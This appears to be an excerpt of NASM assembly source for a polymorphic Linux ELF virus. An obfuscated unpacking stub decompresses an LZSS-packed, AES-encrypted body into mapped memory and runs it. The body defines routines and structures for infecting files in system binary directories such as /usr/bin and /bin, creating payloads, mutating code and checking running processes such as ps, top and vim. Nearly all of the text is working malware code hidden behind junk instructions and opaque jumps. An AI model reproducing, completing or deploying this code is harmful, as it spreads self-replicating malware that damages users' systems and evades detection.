    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Encrypted Proprocessor values.
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Encrypted code.
;-----------------------------------------------------
UnpackExecutableCode:
    jmp         ..@kl75SoeSrWTR
..@VHAFfQ19pF9Z:
    mov         rdx, rax
    mov         rax, rax
    xor         rax, rax
    jmp         $+5
db 0x82, 0xca, 0x66
    js          ..@HdKIkzHz8rpE
    jns         ..@HdKIkzHz8rpE
..@GJkHzNwvbUkg:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    js          ..@CAbNAUnUXv3e
    jns         ..@CAbNAUnUXv3e
..@0avfHgmVzUmw:
    pop         rcx
    jb          ..@rgsR9c7Lligt
    jae         ..@rgsR9c7Lligt
..@DRNkNRNL1G0G:
    xchg        rsp, rsp
    add         ecx, 1
    cmp         cl, dl
    jb          ..@Idd3LIxWjIF4
    jae         ..@Idd3LIxWjIF4
..@faJLzfKzhmo5:
    push        rdx
    pop         rdx
    jmp         $+5
db 0xcf, 0x73, 0x37
    jb          ..@SuezVZkDbHAx
    jae         ..@SuezVZkDbHAx
..@RCPJNGpxOhoh:
    push        rcx
    pop         rcx
    ret
    jl          ..@pJewdb1Q2I7g
    jge         ..@pJewdb1Q2I7g
..@eTNLmcQVCoE2:
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+4
db 0xaa, 0xff
    jb          ..@ADpGyUbD01eF
    jae         ..@ADpGyUbD01eF
..@TbKIUo7bLDow:
    test        rax, rax
    jz          ..@1iY7JfgUoPbw
    rep         nop
    jl          ..@ZNajVNcwwwEQ
    jge         ..@ZNajVNcwwwEQ
..@sXSEg9Rr98nt:
    rep         stosb
    jmp         ..@jcOksO1n7lgL
    xchg        rsi, rsi
    jmp         $+3
db 0xea
    jmp         ..@TbKIUo7bLDow
..@L58b75YHghm7:
    xor         rdi, rdi
    jmp         $+4
db 0x61, 0xa7
    jmp         $+4
db 0x7a, 0x32
    jmp         $+5
db 0xed, 0x0c, 0xde
    jb          ..@GJkHzNwvbUkg
    jae         ..@GJkHzNwvbUkg
..@YTNVdjBbvRrb:
    call        ..@F4xPq9SyMFEI
    jl          ..@9AIW15BVbLnT
    jge         ..@9AIW15BVbLnT
..@E25CY5zbibuO:
    mov         r1, r5
    jl          ..@8EgqUqeGALcm
    jge         ..@8EgqUqeGALcm
LzssDecoder:
    jmp         ..@leuGccyZ8kRi
..@rSaxHNCiG4yz:
    add         bx, cx
    mov         rdx, rdx
    jmp         $+4
db 0xbe, 0x8c
    jmp         ..@AdBXRaYe1gff
..@cByu6Y9wZJU9:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jmp         $+3
db 0x62
    js          ..@uzqpevhIyYzn
    jns         ..@uzqpevhIyYzn
..@pJewdb1Q2I7g:
    add         rsp, _LZSSD_OFF_size
    jl          ..@FxAdewIRGuOr
    jge         ..@FxAdewIRGuOr
..@ZNajVNcwwwEQ:
    mov         rcx, 8
    js          ..@1Hd4hbnHwNyR
    jns         ..@1Hd4hbnHwNyR
..@8AwTOAj70Dpo:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    js          ..@WsadrKbxTXOr
    jns         ..@WsadrKbxTXOr
..@wRaNwyEb4BHO:
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jmp         $+4
db 0xf3, 0x5d
    jmp         ..@vjzNhMDKeI7K
..@HdKIkzHz8rpE:
    xor         rcx, rcx
    mov         rcx, rcx
    xor         rdi, rdi
    jmp         $+4
db 0x7d, 0xdd
    jmp         ..@TsuGj6fENpR3
..@m93pbLibdLfK:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0x06
    jl          ..@uSbqnZFV6d7Z
    jge         ..@uSbqnZFV6d7Z
..@WV9IuiDDt2We:
    mov         rsi, rax 
    mov         rcx, LENGTH_BITS
    jmp         $+5
db 0x60, 0x24, 0x99
    js          ..@YTNVdjBbvRrb
    jns         ..@YTNVdjBbvRrb
..@ODFGCBTNNgG9:
    mov         rax, SYS_MUNMAP
    jmp         $+5
db 0x9a, 0x20, 0xd6
    jmp         $+5
db 0x65, 0x5e, 0xf7
    jmp         ..@Dv7JF0q4v6HS
..@atrI3vw9BCKa:
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    test        dl, dl
    jmp         ..@gtsuNVmDMxfU
..@q3AabdVhvh7s:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jmp         $+4
db 0x50, 0xc1
    jmp         ..@d4rjrYfrH3u2
..@vjzNhMDKeI7K:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    push        rdx
    js          ..@C9VzlLcgkC3e
    jns         ..@C9VzlLcgkC3e
..@C9VzlLcgkC3e:
    pop         rdx
    jl          ..@8GFDRWZKDWfs
    jge         ..@8GFDRWZKDWfs
..@Dv7JF0q4v6HS:
    syscall
    jmp         ..@AKAhUe1rpE5z
..@tUTb773L9zkx:
    xor         rbx, rbx
    jmp         $+4
db 0xcc, 0x35
    jmp         ..@8AwTOAj70Dpo
..@3t5YDZqHLfkW:
%ifdef X86_32
    int         0x80
%endif
    jb          ..@49riuF2P34DF
    jae         ..@49riuF2P34DF
..@oLjMcBVXBJKn:
    mov         rbp, rbp
    GGLOBAL     _packed
    je          ..@E25CY5zbibuO
    jne         ..@E25CY5zbibuO
..@d4rjrYfrH3u2:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
    mov         eax, SYS_MMAP
    syscall
%endif
    jb          ..@cByu6Y9wZJU9
    jae         ..@cByu6Y9wZJU9
..@leuGccyZ8kRi:
    sub         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0x6f, 0x7b, 0xd6
    js          ..@Hy5X8s0uUuA6
    jns         ..@Hy5X8s0uUuA6
..@CV6llEixu1wF:
    xor         rax, rax
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    xchg        rcx, rcx
    jmp         $+3
db 0x8a
    jmp         ..@ruICX35jZAUK
..@uzqpevhIyYzn:
    push        rdx
    pop         rdx
    jb          ..@oLjMcBVXBJKn
    jae         ..@oLjMcBVXBJKn
..@VNHWdMC3ioK5:
    ret
    jmp         $+5
db 0x5c, 0x17, 0x69
..@49riuF2P34DF:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+4
db 0x5f, 0x6d
    jl          ..@DjedwtTxmYTx
    jge         ..@DjedwtTxmYTx
..@zYmsc1ImMSTo:
    call        ExitProgram
    jmp         $+5
db 0xf2, 0x09, 0xc2
    jmp         LzssDecoder
..@cV6nhQLNIBFd:
    or          eax, 1
    jmp         $+3
db 0x4f
    jmp         ..@g2r1xUTDuEta
..@C0jwmLqSqvUr:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    mov         rax, 0x20
    jmp         $+4
db 0xff, 0x7f
    jl          ..@sXSEg9Rr98nt
    jge         ..@sXSEg9Rr98nt
..@h8wfJkSdUyNq:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    mov         dl, BYTE [rbx]
    js          ..@wRaNwyEb4BHO
    jns         ..@wRaNwyEb4BHO
..@FxAdewIRGuOr:
    mov         rdi, rdi
    xchg        rbx, rbx
    js          ..@VNHWdMC3ioK5
    jns         ..@VNHWdMC3ioK5
..@30ev0AXZdu4E:
    push        rdx
    jmp         $+5
db 0x03, 0x99, 0x0c
    jmp         $+5
db 0xf0, 0xa6, 0x0c
    je          ..@bDnWce7lmOFl
    jne         ..@bDnWce7lmOFl
..@EIgqRreGUMVK:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+5
db 0xee, 0x8a, 0x3d
    jmp         ..@4mpVBQPNekOM
..@ynASgIX8O9jC:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+3
db 0x67
    js          ..@C0jwmLqSqvUr
    jns         ..@C0jwmLqSqvUr
..@Idd3LIxWjIF4:
    jle         ..@TsuGj6fENpR3
    js          ..@jcOksO1n7lgL
    jns         ..@jcOksO1n7lgL
..@0EIGiiJhOrpf:
    call        ..@F4xPq9SyMFEI
    jmp         ..@WV9IuiDDt2We
..@ruICX35jZAUK:
    mov         r2, original_virus_len-non_packed_len
    je          ..@ODFGCBTNNgG9
    jne         ..@ODFGCBTNNgG9
..@4mpVBQPNekOM:
%ifdef X86_32
    push        ebp
%endif
    jmp         ..@Xq2oC9WQSCHr
..@DjedwtTxmYTx:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         ..@7JCSxwx16ohy
..@bAurJ7Vz9My5:
    rep         nop
    push        rdi
    je          ..@RCPJNGpxOhoh
    jne         ..@RCPJNGpxOhoh
..@D9k7Avau2djc:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jb          ..@zQDajsucIUS5
    jae         ..@zQDajsucIUS5
..@vMkSiGIKifeU:
    jmp         ..@pJewdb1Q2I7g
    jmp         $+3
db 0xe8
    jmp         ..@F4xPq9SyMFEI
..@rgsR9c7Lligt:
    xchg        rdx, rdx
    jmp         $+3
db 0x86
    jb          ..@DRNkNRNL1G0G
    jae         ..@DRNkNRNL1G0G
..@CAbNAUnUXv3e:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    push        rcx
    jmp         ..@0avfHgmVzUmw
..@1Hd4hbnHwNyR:
    call        ..@F4xPq9SyMFEI
    mov         rcx, rcx
    xor         rdi, rdi
    jmp         $+5
db 0x6f, 0xad, 0x3f
    jmp         $+5
db 0x67, 0xc6, 0xcb
    jb          ..@iYNeTc2Bw0BT
    jae         ..@iYNeTc2Bw0BT
..@1iY7JfgUoPbw:
    mov         rcx, POSITION_BITS
    js          ..@0EIGiiJhOrpf
    jns         ..@0EIGiiJhOrpf
..@Hy5X8s0uUuA6:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    xchg        rsi, rsi
    js          ..@gV731B5G98nG
    jns         ..@gV731B5G98nG
..@yvCYSxh4gQM1:
    xchg        rdx, rdx
    jmp         $+3
db 0x1f
    jmp         $+4
db 0xb4, 0x64
    jmp         $+5
db 0xd6, 0xa7, 0xc9
    jmp         $+4
db 0xef, 0x13
    jmp         ..@24RqOi6aZdvn
..@uSbqnZFV6d7Z:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0xe9
    jmp         $+4
db 0xae, 0xe4
    jmp         ..@D9k7Avau2djc
..@cljKKciSqMGI:
    mov         r2d, DWORD [r5]
    sub         r2, non_packed_len
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    jb          ..@CtWME97lEORb
    jae         ..@CtWME97lEORb
..@TsuGj6fENpR3:
    mov         rbx, rsi
    jmp         ..@rSaxHNCiG4yz
..@iYNeTc2Bw0BT:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    mov         rsi, rsi
    jmp         ..@m93pbLibdLfK
..@HBas6c5hpsCR:
    add         rax, 1
    jmp         $+3
db 0xeb
    jmp         $+4
db 0x16, 0xd2
    jb          ..@VHAFfQ19pF9Z
    jae         ..@VHAFfQ19pF9Z
..@8EgqUqeGALcm:
    GGLOBAL     virus_len
    jb          ..@X5HgOcTbcZn8
    jae         ..@X5HgOcTbcZn8
..@24RqOi6aZdvn:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+4
db 0xcf, 0x25
    jl          ..@faJLzfKzhmo5
    jge         ..@faJLzfKzhmo5
..@gV731B5G98nG:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jb          ..@ynASgIX8O9jC
    jae         ..@ynASgIX8O9jC
..@TRG2k2Ul06e1:
    pop         rbx
    jmp         $+5
db 0xa2, 0x03, 0xb0
    jmp         $+3
db 0x64
    js          ..@HBas6c5hpsCR
    jns         ..@HBas6c5hpsCR
..@gtsuNVmDMxfU:
    xchg        rax, rax
    jb          ..@GQlih2tGvjYw
    jae         ..@GQlih2tGvjYw
..@9AIW15BVbLnT:
    push        rbx
    jmp         $+4
db 0x2b, 0x4c
    jmp         ..@30ev0AXZdu4E
..@jcOksO1n7lgL:
    mov         rcx, 1
    call        ..@F4xPq9SyMFEI
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    jmp         $+3
db 0x31
    jmp         $+3
db 0xcc
    js          ..@eTNLmcQVCoE2
    jns         ..@eTNLmcQVCoE2
..@yTwTRsBye9Cn:
    xor         r3, r3
    jmp         $+4
db 0x11, 0xd2
    jb          ..@qdkHpiIXTPbt
    jae         ..@qdkHpiIXTPbt
..@WsadrKbxTXOr:
    jnz         ..@8GFDRWZKDWfs
    jmp         $+5
db 0x2b, 0xb7, 0x9b
    js          ..@h8wfJkSdUyNq
    jns         ..@h8wfJkSdUyNq
..@Xq2oC9WQSCHr:
%ifdef X86_32
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
%endif
    jmp         ..@3t5YDZqHLfkW
..@AdBXRaYe1gff:
    mov         rdx, rdx
    and         bx, WINDOW_LENGTH-1
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         $+4
db 0xe6, 0xb6
    jmp         ..@yEar6kSvA0tS
..@F4xPq9SyMFEI:
    pop         rdi
    xor         rax, rax
    xor         rdx, rdx
    jmp         $+4
db 0x1b, 0xdf
    jl          ..@tUTb773L9zkx
    jge         ..@tUTb773L9zkx
..@GQlih2tGvjYw:
    jz          ..@g2r1xUTDuEta
    xchg        rsi, rsi
    xchg        rbx, rbx
    je          ..@cV6nhQLNIBFd
    jne         ..@cV6nhQLNIBFd
..@CfI1NCH0kaJj:
    call        rax
    jl          ..@EejvOV1oNfnt
    jge         ..@EejvOV1oNfnt
..@X5HgOcTbcZn8:
    xor         r2, r2
    jmp         $+3
db 0xe6
    jmp         ..@cljKKciSqMGI
..@8GFDRWZKDWfs:
    shl         eax, 1
    jmp         $+4
db 0xe6, 0x2a
    jb          ..@atrI3vw9BCKa
    jae         ..@atrI3vw9BCKa
..@EejvOV1oNfnt:
    rep         nop
    jmp         $+4
db 0xa0, 0x4b
    jb          ..@CV6llEixu1wF
    jae         ..@CV6llEixu1wF
..@zQDajsucIUS5:
    jmp         ..@jcOksO1n7lgL
    jmp         $+5
db 0x86, 0xf4, 0x15
    js          ..@1iY7JfgUoPbw
    jns         ..@1iY7JfgUoPbw
..@2jN3nbJyKxaE:
%ifdef X86_64
    mov         edx, 111b
%endif
    jl          ..@q3AabdVhvh7s
    jge         ..@q3AabdVhvh7s
..@AKAhUe1rpE5z:
    sub         rsp, _UEC_OFF_size
    jmp         $+4
db 0x12, 0x29
    js          ..@zYmsc1ImMSTo
    jns         ..@zYmsc1ImMSTo
..@CtWME97lEORb:
    call        LzssDecoder
    jmp         $+4
db 0x11, 0x8a
    jb          ..@yvCYSxh4gQM1
    jae         ..@yvCYSxh4gQM1
..@ADpGyUbD01eF:
    jg          ..@TbKIUo7bLDow
    jb          ..@vMkSiGIKifeU
    jae         ..@vMkSiGIKifeU
..@yEar6kSvA0tS:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jmp         $+3
db 0xec
    jmp         ..@L58b75YHghm7
..@7JCSxwx16ohy:
%ifdef X86_64
    mov         esi, original_virus_len-non_packed_len
%endif
    jmp         $+3
db 0x0f
    jb          ..@2jN3nbJyKxaE
    jae         ..@2jN3nbJyKxaE
..@g2r1xUTDuEta:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    sub         rcx, 1
    jnz         ..@8AwTOAj70Dpo
    jb          ..@bAurJ7Vz9My5
    jae         ..@bAurJ7Vz9My5
..@kl75SoeSrWTR:
    xor         rax, rax
    xor         r1, r1
    xor         r2, r2
    jb          ..@yTwTRsBye9Cn
    jae         ..@yTwTRsBye9Cn
..@qdkHpiIXTPbt:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
    mov         edx, 111b
    mov         esi, 0x22
%endif
    jmp         ..@EIgqRreGUMVK
..@bDnWce7lmOFl:
    pop         rdx
    xchg        rax, rax
    jmp         $+4
db 0xdd, 0xe5
    jmp         $+5
db 0x14, 0xc6, 0x0e
    je          ..@TRG2k2Ul06e1
    jne         ..@TRG2k2Ul06e1
..@SuezVZkDbHAx:
    xchg        rdi, rdi
    mov         m8, rax
    jmp         ..@CfI1NCH0kaJj

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _MUTA_OFF
    .start      resq 0x1
    .index      resd 0x1
    .size       resd 0x1
    .key        resq 0x1
    .random_BYTE resb 0x1
endstruc
struc _AESE_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
    .keyprev    resd 0x1
    .meta_ptr   resq 0x1
endstruc
struc _KEYGEN_OFF
    .bufferaddr resq 0x1
    .fd         resd 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc7:      db "top", 0
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

bash:       db "/bin/bash", 0
urandom:    db "/dev/urandom", 0
home:       db "HOME", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@GJBVnObZH1mn
..@nGCaICFiBqsg:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+3
db 0xed
    jmp         ..@DEzLasrSuJ8L
..@SkOHJ8NCBgLA:
%ifndef ENABLE_DEBUGGING
    pop         rdi
%endif
    jl          ..@5zfBBNKMOIcs
    jge         ..@5zfBBNKMOIcs
..@sBBzkCJrhy4H:
    mov         rdx, rdx
    jmp         $+4
db 0x66, 0xcd
    jl          ..@d1tyzBU4cupH
    jge         ..@d1tyzBU4cupH
..@v7fPcROVTh7G:
%ifdef X86_64
    xor         rax, rax
%endif
    jmp         $+3
db 0x3b
    jl          ..@hGmytNHSKIZO
    jge         ..@hGmytNHSKIZO
..@FKwHFue2lroP:
    xor         rax, rax
    jl          ..@0hCxOe4jXI1C
    jge         ..@0hCxOe4jXI1C
..@TCdf6PWlmoHY:
    mov         rbp, rbp
    jb          ..@FouWVP07bMGj
    jae         ..@FouWVP07bMGj
..@XI1n6fWznf36:
    aesenclast  xmm0, xmm1
    movdqu      [rsi+rcx], xmm0
    jmp         $+5
db 0xe6, 0x44, 0xd7
    jmp         $+5
db 0x2b, 0x10, 0x36
    js          ..@CzIdzgTw6kX7
    jns         ..@CzIdzgTw6kX7
..@bguoLTh9Cwot:
    mov         DWORD [rsi+rcx], edi
    je          ..@gNJWoRZMHiUW
    jne         ..@gNJWoRZMHiUW
..@0VtK0W4Ng6yP:
    jz          ..@DQApDIXBnQUn
    mov         rbp, rbp
    jmp         ..@fJwi4KO7awaA
..@gTq2dKGl9G3y:
    or          bl, dl
    jmp         $+3
db 0x31
    jl          ..@zxo0MSyfr4Fx
    jge         ..@zxo0MSyfr4Fx
..@rLWLp0ayKoSM:
%ifdef X86_32
    mov         ecx, original_virus_len+PADDING
    mov         edx, 11b
%endif
    js          ..@idlx33sMc0LI
    jns         ..@idlx33sMc0LI
..@7eafCbzbwBTb:
%ifdef X86_64
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jmp         $+5
db 0x1e, 0xfd, 0xcb
    jb          ..@c4KjbmBYtRfw
    jae         ..@c4KjbmBYtRfw
..@NDWcW9tDbkDC:
    xor         rcx, rcx
    xor         rdx, rdx
    mov         edx, DWORD [rdi+rax+1]
    jb          ..@PgvEiAB3Lgfr
    jae         ..@PgvEiAB3Lgfr
..@Vb0t7lWVQDiz:
%ifdef X86_32
    mov         dx, WORD [edi]
%endif
    jmp         $+4
db 0x45, 0x7d
    jb          ..@xuIJqcPiDEUX
    jae         ..@xuIJqcPiDEUX
..@mDOd6T0xnf16:
    pop         rbx
    mov         r3, r1
    sub         r3, PADDING
    jmp         $+4
db 0xb1, 0x12
    jb          ..@sEmL7O5vXfog
    jae         ..@sEmL7O5vXfog
..@q4BSrxwCxAvM:
    pop         r1
    jmp         $+3
db 0x84
    jmp         $+4
db 0x88, 0x7a
    js          ..@H7ZXfaPc1MFk
    jns         ..@H7ZXfaPc1MFk
..@cZ3uI3PqtNep:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         $+4
db 0x5d, 0x7d
    js          ..@6zg5YMDAvG4C
    jns         ..@6zg5YMDAvG4C
..@bIdloQfeFGW0:
%ifdef X86_64
    cmp         bx, 5841h
%endif
    jmp         ..@Au0tXk7m4k0Y
..@nOhfdBkO0jbB:
    pop         rbx
    movdqu      xmm1, oWORD [rsp+0x70]
    aesenc      xmm0, xmm1
    jmp         $+3
db 0xc2
    js          ..@X1BunZtx53qh
    jns         ..@X1BunZtx53qh
..@BdLOVSGSUV6f:
    pop         rax
    push        rax
    pop         rax
    jmp         $+3
db 0xa8
    jl          ..@KVwNGJiQRqU7
    jge         ..@KVwNGJiQRqU7
..@AlCIMEHe9YVn:
    xor         r4, r4
    jmp         $+5
db 0x95, 0x8f, 0x47
    jb          ..@tXkh6qt8Ddiz
    jae         ..@tXkh6qt8Ddiz
..@1lM0Ad4mpxqx:
    push        rdi
    jmp         ..@jN6i79JAdeN0
..@Dik41WCCgUoO:
    pop         rcx
    jmp         ..@dQGwxJuilyOz
..@xhnPlifgVHJv:
    xor         r1, r1
    mov         r1w, WORD [rsp+r4]
    jmp         $+3
db 0x4b
    js          ..@ZQ2ktwaqdODN
    jns         ..@ZQ2ktwaqdODN
..@yBz7PolRxwJn:
    jne         ..@kBgzb2EEIGiI
    jb          ..@c5IF0Cynpi8I
    jae         ..@c5IF0Cynpi8I
..@4vZTWU24fFP3:
    and         dx, 0f0ffh
    jmp         $+5
db 0xda, 0x44, 0x4e
    jl          ..@INVtTYitlYXW
    jge         ..@INVtTYitlYXW
..@FZJjh9kn4e8x:
%ifdef X86_32
    push        rdi
%endif
    jmp         $+4
db 0x7d, 0xe3
    js          ..@LJYrC9btzRl3
    jns         ..@LJYrC9btzRl3
..@OwrxDVUO0Ao1:
    xor         rax, rax
    jmp         $+4
db 0x74, 0x70
    jl          ..@xUsCIMreGjaT
    jge         ..@xUsCIMreGjaT
..@KpIaA8NLpmac:
    pop         rbx
    pop         rcx
    jmp         $+4
db 0xc0, 0xa9
    jmp         $+4
db 0x71, 0xe2
    jmp         $+3
db 0xdb
    jb          ..@kCZ5fAeLbInZ
    jae         ..@kCZ5fAeLbInZ
..@Pox1uqPB47tR:
%ifdef X86_64
    pop         rdx
    push        rbx
    pop         rbx
%endif
    js          ..@hikxo8KBUiPL
    jns         ..@hikxo8KBUiPL
..@JTXzTEBU3BNa:
    cmp         rax, 0x00
    jle         ..@VIudUbte6qRw
    je          ..@XeAfyXcrj4C8
    jne         ..@XeAfyXcrj4C8
..@oIp7BqqVJ7ZB:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    js          ..@d7jJx00jpdOy
    jns         ..@d7jJx00jpdOy
..@5f1xWIsECAT3:
%ifdef X86_64
    jz          ..@Z9ElKfnhyf6L
%endif
    jmp         $+5
db 0xb2, 0xe1, 0xd8
    jmp         $+4
db 0x16, 0xe9
    js          ..@PJuRPZKoDMt1
    jns         ..@PJuRPZKoDMt1
..@JR2Dne0gGJBZ:
    push        rdx
    pop         rdx
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jb          ..@QJYPh4pm3WrZ
    jae         ..@QJYPh4pm3WrZ
..@4TLwH3pJKSvG:
    mov         r1, r5
    jmp         $+3
db 0xbf
    js          ..@umZVg8BlZVfr
    jns         ..@umZVg8BlZVfr
..@L3WDRU6rCHKW:
    xor         rcx, rcx
    xor         rbx, rbx
    xor         rdx, rdx
    jmp         $+5
db 0x93, 0x41, 0xac
    je          ..@aFf1HmGowQOv
    jne         ..@aFf1HmGowQOv
..@BMgmzENq966g:
    and         rax, DF_1_PIE
    test        eax, eax
    jmp         $+5
db 0xc4, 0xd3, 0xde
    jmp         $+5
db 0x6a, 0x0d, 0xa1
    je          ..@I5Yj1s61ITEf
    jne         ..@I5Yj1s61ITEf
..@n6phly1eKMU2:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    xchg        rcx, rcx
    xor         r2, r2
    jmp         ..@JoTO25Tmsnro
..@A6BUJn5ZPHpn:
    mov         WORD [rdi], dx
    mov         DWORD [rdi+2], ecx
    or          dx, 100000000b
    jmp         ..@pxcHiSubJANH
..@lSc44rdQYwwd:
%ifdef X86_32
    shr         edx, 11
%endif
    jmp         $+4
db 0x33, 0x80
    jmp         $+5
db 0xb0, 0x12, 0xf4
    jmp         ..@2oIquIyAg8lc
..@PJd52C4Yo2Pv:
%ifdef X86_32
    push        rsi
%endif
    jmp         ..@lvOB76B4yRNp
..@6lXoBiSwolOo:
%ifdef X86_64
    jne         ..@Xti8gHOk0tZB
%endif
    jl          ..@TpOExPhdL6bw
    jge         ..@TpOExPhdL6bw
..@zSa3GlUmDLmL:
    push        rcx
    jl          ..@ckFKMBR1KXRD
    jge         ..@ckFKMBR1KXRD
..@trIo0ovGBoQS:
    xchg        rdx, rdx
    mov         dl, 0fh
    jmp         $+3
db 0x06
    jb          ..@A6BUJn5ZPHpn
    jae         ..@A6BUJn5ZPHpn
..@D8banpNB4D8h:
    jz          ..@PA9RtOahiuFj
    jmp         $+4
db 0x88, 0x9e
    jl          ..@oLjrzJJxKJjy
    jge         ..@oLjrzJJxKJjy
..@2u018JOt5pcM:
    pop         rcx
    pop         rsi
    jmp         ..@Qm2RprrCeauZ
..@y4FgArOH3lON:
    push        rax
    mov         rdx, rdx
    mov         rbp, rbp
    jb          ..@CA86gJ6boPlR
    jae         ..@CA86gJ6boPlR
..@vPEIj78DGbk6:
    jz          ..@OMEG9ZN5wbLd
    jmp         ..@vL6Gn2OJxsss
..@VGDcJXp9DlQj:
    cmp         eax, 07fh
    jbe         ..@3leEV3wtDFcw
    je          ..@fuX3ryKMEWwV
    jne         ..@fuX3ryKMEWwV
..@LjLY55shq71A:
    pop         rsi
    jmp         ..@GQAbyboOCvRO
CreatePayload:
    jmp         ..@Zmt6FMkWNvAX
..@iPmV9M7rXfwC:
    push        rsi
    jmp         $+4
db 0xce, 0xe2
    jmp         ..@pbVOrJwLUIvd
..@6RZOuwSaZMw9:
    push        rdi
    pop         rdi
    push        rsi
    jmp         $+3
db 0xf1
    jl          ..@HWMG2WDg9Evh
    jge         ..@HWMG2WDg9Evh
..@yzZwDbW8nSP2:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    jb          ..@h5GMdlKgvosa
    jae         ..@h5GMdlKgvosa
..@r3qX0Nech4Wy:
    ret
